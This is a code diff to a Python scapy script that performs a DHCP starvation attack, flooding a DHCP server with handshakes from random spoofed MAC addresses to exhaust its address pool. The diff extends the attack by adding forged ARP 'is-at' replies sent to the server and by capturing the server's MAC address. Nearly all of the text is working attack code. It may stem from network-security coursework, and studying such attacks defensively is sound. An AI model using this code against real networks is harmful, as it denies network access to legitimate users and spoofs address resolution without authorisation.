@@ -1,7 +1,7 @@
 from scapy.all import *
 from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from scapy.layers.l2 import Ether, ARP
 
 
 def dhcp_discover(spoofed_mac, i_face):
@@ -51,6 +51,12 @@ def dhcp_request(req_ip, spoofed_mac, server_ip, i_face):
     print('request sent')
 
 
+def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
+    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
+    # Sends the is at message to the src_mac ()
+    send(reply, iface=i_face)
+
+
 def starve(target_ip=0, i_face=conf.iface, persistent=False):
     """
     performing the actual dhcp starvation by generating a dhcp handshake with a fake mac address
@@ -59,6 +65,7 @@ def starve(target_ip=0, i_face=conf.iface, persistent=False):
     :param i_face: the systems network interface for the attack
     :param persistent: a flag indicating if the attack is persistent or temporary
     """
+    server_mac = sr(ARP(op=ARP.who_has, pdst=str(target_ip)))[0][ARP].hwsrc
     while True:
         counter = 0
         mac = RandMAC()
@@ -89,11 +96,13 @@ def starve(target_ip=0, i_face=conf.iface, persistent=False):
                 if p[0][DHCP].options[0][1] == 2:
                     ip = p[0][BOOTP].yiaddr
                     src = p[0][IP].src
+                    server_mac = p[0][Ether].src
                     if src == target_ip or not target_ip:
                         break
                     continue
         # Send DHCP request to the server with the given ip form the DHCP offer.
-        dhcp_request(req_ip=str(ip), spoofed_mac=mac, server_ip=str(src), i_face=i_face)
+        dhcp_request(req_ip=str(ip), spoofed_mac=mac, server_ip=str(target_ip), i_face=i_face)
+        arp_reply(src_ip=str(ip), source_mac=mac, server_ip=str(target_ip), server_mac=server_mac, i_face=i_face)
 
 
 if __name__ == "__main__":
@@ -110,4 +119,3 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     starve(target_ip=args.target, i_face=args.iface, persistent=args.persistent)
-
